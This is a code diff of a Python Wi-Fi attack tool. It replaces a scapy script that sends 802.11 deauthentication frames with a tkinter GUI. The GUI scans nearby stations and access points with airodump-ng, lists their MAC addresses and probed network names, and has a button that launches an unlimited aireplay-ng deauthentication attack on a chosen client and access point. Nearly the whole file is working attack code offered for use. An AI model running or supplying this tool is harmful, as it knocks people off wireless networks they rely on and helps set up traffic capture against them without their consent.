@@ -1,48 +1,97 @@
-from scapy.all import *
+import tkinter as tk
+import threading
+import subprocess
+import csv
+import time
+from tkinter import ttk
+
+global net_card
+netcard = "wlo1"
+
+class Application(tk.Frame):
+    def __init__(self, master=None):
+        super().__init__(master)
+        self.master = master
+        self.pack()
+        self.create_widgets()
+
+    def create_widgets(self):
+    # create input boxes and button to filter captured data
+        self.inputbox = tk.Frame(self)
+        self.inputbox.pack(side="top", fill="x")
+        
+        self.clientlabel = tk.Label(self.inputbox, text="Station MAC:")
+        self.clientlabel.pack(side="left", padx=5, pady=5)
+
+        self.clientid = tk.Entry(self.inputbox)
+        self.clientid.pack(side="left", padx=5, pady=5)
+
+        self.bssidlabel = tk.Label(self.inputbox, text="BSSID:")
+        self.bssidlabel.pack(side="left", padx=5, pady=5)
+        
+        self.bssid = tk.Entry(self.inputbox)
+        self.bssid.pack(side="left", padx=5, pady=5)
+
+        self.deauthbutton = tk.Button(self.inputbox, text="Deauth", command=lambda:self.deauth(self.clientid.get(), self.bssid.get()))
+        self.deauthbutton.pack(side="left", padx=5, pady=5)
+
+        # create button to start capturing
+        self.start_button = tk.Button(self, text="Find targets", command=self.start_capture)
+        self.start_button.pack(side="top")
+
+        # create table to display captured data
+        self.table = ttk.Treeview(self, columns=("Station MAC", "BSSID", "Probed ESSIDs"), show="headings")
+        self.table.heading("Station MAC", text="Station MAC")
+        self.table.heading("BSSID", text="BSSID")
+        self.table.heading("Probed ESSIDs", text="Probed ESSIDs")
+        self.table.pack(side="bottom", fill="both", expand=True)
 
 
-def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0mon", verbose=1):
-    # 802.11 frame
-    # addr1: destination MAC
-    # addr2: source MAC
-    # addr3: Access Point MAC
-    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-    # stack them up
-    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-    # send the packet
-    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)
+    def start_capture(self):
+        # create thread to run airodump-ng command
+        self.thread = threading.Thread(target=self.run_airodump)
+        self.thread.start()
 
+    def run_airodump(self):
+        self.start_button["state"] = "disabled"
+        # run airodump-ng command for 10 seconds
+        command = "sudo airodump-ng wlo1mon --write output"
+        subprocess.Popen(command, shell=True)
+        self.start_button['text'] = "Scanning..."
+        time.sleep(10)
+        subprocess.call(["sudo", "pkill", "airodump-ng"])
+
+        # read the CSV file and parse the necessary data
+        with open('output-01.csv', 'r') as file:
+            reader = csv.reader(file)
+            for i in reader:
+                if i != []:
+                    if i[0] != "Station MAC":
+                        next(reader)
+                    else:
+                        break
+
+            for i in reader:
+                try:       
+                    self.table.insert("", "end", values=(i[0], i[5], i[6] ))
+                except IndexError:
+                    pass
+        subprocess.run(["rm", "-f", "output-01.csv", "output-01.cap", "output-01.kismet.csv", "output-01.kismet.netxml", "output-01.log.csv"])
+        self.start_button['text'] = "Find targets"
+        self.start_button["state"] = "normal";
+
+    def deauth(self, client, ap):
+        self.deauthbutton['state'] = "disabled"
+        self.deauthbutton['text'] = "Running Deauth attack..."
+        subprocess.run(["sudo", "aireplay-ng", "-D", "-0", "0", "-a", ap, "-c", client, netcard+"mon"])
+        time.sleep(10)
+        subprocess.call(["sudo", "pkill", "aireplay-ng"])
+        self.deauthbutton['text'] = "Deauth"
+        self.deauthbutton['state'] = "normal"
 
 if __name__ == "__main__":
-    import argparse
-    parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
-    parser.add_argument("target", help="Target MAC address to deauthenticate.")
-    parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
-    parser.add_argument("-c" , "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0", default=0)
-    parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms", default=0.1)
-    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0mon'", default="wlan0mon")
-    parser.add_argument("-v", "--verbose", help="wether to print messages", action="store_true")
-
-    args = parser.parse_args()
-    target = args.target
-    gateway = args.gateway
-    count = int(args.count)
-    interval = float(args.interval)
-    iface = args.iface
-    verbose = args.verbose
-
-    if count == 0:
-        # if count is 0, it means we loop forever (until interrupt)
-        loop = 1
-        count = None
-    else:
-        loop = 0
-
-    # printing some info messages"
-    if verbose:
-        if count:
-            print(f"[+] Sending {count} frames every {interval}s...")
-        else:
-            print(f"[+] Sending frames every {interval}s for ever...")
-
-    deauth(target, gateway, interval, count, loop, iface, verbose)
+    subprocess.run(["sudo", "airmon-ng", "start", netcard])
+    root = tk.Tk()
+    app = Application(master=root)
+    app.mainloop()
+    subprocess.run(["sudo", "airmon-ng", "stop", netcard+"mon"])
